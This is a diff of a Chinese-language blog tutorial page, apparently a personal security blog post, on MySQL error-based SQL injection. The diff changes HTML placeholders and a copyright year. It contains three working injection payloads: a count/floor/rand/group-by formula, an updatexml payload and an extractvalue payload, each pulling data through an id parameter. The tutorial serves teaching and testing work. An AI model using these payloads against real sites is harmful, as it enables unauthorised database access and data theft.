@@ -87,10 +87,10 @@
 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
 </code></pre><h3 id="0x01-利用方式">0x01 利用方式</h3>
 <p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p>
-<p>?id=2&rsquo; and (select 1 from <!-- raw HTML omitted -->(select <!-- raw HTML omitted -->count(*),<!-- raw HTML omitted -->concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x<!-- raw HTML omitted --><!-- raw HTML omitted --> from information_schema.tables group by x )a<!-- raw HTML omitted -->
+<p>?id=2&rsquo; and (select 1 from <f>(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
 )--+</p>
-<p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<!-- raw HTML omitted -->SELECT @@version<!-- raw HTML omitted -->),0x7e),1)--+</p>
-<p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<!-- raw HTML omitted -->select @@version<!-- raw HTML omitted -->),0x7e))--+</p>
+<p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)--+</p>
+<p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))--+</p>
 <p>第一个公式具体原理可以参考：<a href="/posts/2016/mysql-injection-error-based-theory-count-rand-groupby?_blank">MySQL报错注入原理分析(count()、rand()、group by)</a></p>
 <h3 id="0x02-公式解析">0x02 公式解析</h3>
 <pre tabindex="0"><code>floor()是取整数
@@ -360,7 +360,7 @@ group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚
     </p>
   
   <p class="copyright">
-    Copyright © 2015-2023
+    Copyright © 2015-2024
     <a href="https://wyb0.com/"><strong>Reber</strong></a>.
 
     Built with
